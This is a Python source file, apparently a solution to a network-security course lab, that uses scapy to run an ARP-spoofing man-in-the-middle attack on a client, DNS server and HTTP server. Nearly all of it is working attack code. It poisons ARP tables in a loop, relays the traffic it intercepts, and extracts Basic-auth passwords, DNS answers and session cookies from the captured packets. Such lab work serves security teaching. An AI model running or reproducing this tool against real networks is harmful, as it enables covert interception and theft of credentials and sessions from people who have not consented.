import argparse
import base64
import sys
import threading
import time

from scapy.all import *


SYN  = 0b000010
PSH  = 0b001000
ACK  = 0b010000

SYN_ACK = SYN | ACK
PSH_ACK = PSH | ACK


def get_credentials(raw_load: bytes):
    """
    'GET / HTTP/1.1\r\nHost: www.bankofbailey.com\r\nAuthorization: Basic QXp1cmVEaWFtb25kOmh1bnRlcjI=\r\nUser-Agent: curl/7.58.0\r\nAccept: */*\r\n\r\n'
    """
    return base64.b64decode(raw_load.decode().split('\r\n')[2].split(':')[1].strip().split(' ')[1]).decode('utf-8').split(':')


def  get_cookie(raw_load: bytes):
    """
    ###[ Raw ]### 
    load      = 'HTTP/1.1 200 OK\r\nServer: nginx/1.17.8\r\nDate: Fri, 12 Apr 2024 13:33:38 GMT\r\nContent-Type: text/html\r\nContent-Length: 45\r\nLast-Modified: Tue, 11 Feb 2020 18:07:23 GMT\r\nConnection: keep-alive\r\nETag: "5e42ed5b-2d"\r\nCache-Control: no-cache\r\nSet-Cookie: session=35YATR8R8SW8PCIA\r\nAccept-Ranges: bytes\r\n\r\n<html><body><h1>It works!</h1></body></html>\n'
    """
    return raw_load.decode().split('\r\n')[9].split(':')[1].strip().split('=')[1]


def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('# \t{0}'.format(s))
        sys.stdout.flush()


def mac(ip):
    """ Returns the mac address for an IP """
    resp = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip))
    m = resp[0][0][1].hwsrc
    return m


def spoof(srcIP, srcMAC, dstIP, dstMAC):
    """ Spoof ARP so that dst changes its ARP table entry for src """
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    send(ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op=2))


def spoof_thread(
    clientIP, clientMAC, 
    httpServerIP, httpServerMAC, 
    dnsServerIP, dnsServerMAC, 
    attackerIP, attackerMAC, 
    interval=3
):
    """ ARP spoofs client, httpServer, dnsServer """
    while True:
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC)       # Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC)  # Spoof httpServer ARP table
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC)      # Spoof client ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC)    # Spoof dnsServer ARP table
        time.sleep(interval)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    send(ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op=2))


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
# NOTE: beware of output requirements!
# Example output:
# # this is a comment that will be ignored by the grader
# *hostname:somehost.com.
# *hostaddr:1.2.3.4
# *basicauth:password
# *cookie:Name=Value
def interceptor(packet):

    global clientMAC, clientIP
    global httpServerMAC, httpServerIP
    global dnsServerIP, dnsServerMAC
    global attackerIP, attackerMAC
    global arp_table

    if packet[Ether].dst != attackerMAC:
        return
    
    if not packet.haslayer(IP) or packet[IP].src not in [clientIP, httpServerIP, dnsServerIP]:
        return

    print(f'# \t{packet[IP].src}, sent:{packet.summary()}')

    packet[Ether].src = attackerMAC
    packet[Ether].dst = arp_table[packet[IP].dst]

    del packet.chksum
    sendp(packet)

    if packet[IP].src == clientIP and packet[IP].dst == httpServerIP:
        if packet[TCP].flags.value == PSH_ACK:
            try:
                username, password = get_credentials(packet[Raw].load)
                print(f'{chr(42)}basicauth:{password}')
            except Exception as e:
                # print('#', e)
                # print(packet.show())
                pass
    elif packet[IP].src == dnsServerIP and packet[IP].dst == clientIP:
        if packet.haslayer(DNS):
            try:
                print(f'{chr(42)}hostname:{packet[DNS].qd.qname.decode()}')
                print(f'{chr(42)}hostaddr:{packet[DNS].an.rdata}')
            except Exception as e:
                # print('#', e)
                # print(packet.show())
                pass
    elif packet[IP].src == httpServerIP and packet[IP].dst == clientIP:
        if packet[TCP].flags.value == PSH_ACK:
            try:
                print(f'{chr(42)}cookie:{get_cookie(packet[Raw].load)}')
            except Exception as e:
                # print('#', e)
                # print(packet.show())
                pass
            

if __name__ == "__main__":
    """
    python3 shared-with-host/abadia2/NetSec/cp2.1.passive.py -i eth0 --clientIP 10.4.22.9 --dnsIP 10.4.22.80 --httpIP 10.4.22.218 --verbosity 1
    """
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    arp_table = {
        clientIP: clientMAC,
        httpServerIP: httpServerMAC,
        dnsServerIP: dnsServerMAC,
        attackerIP: attackerMAC
    }

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
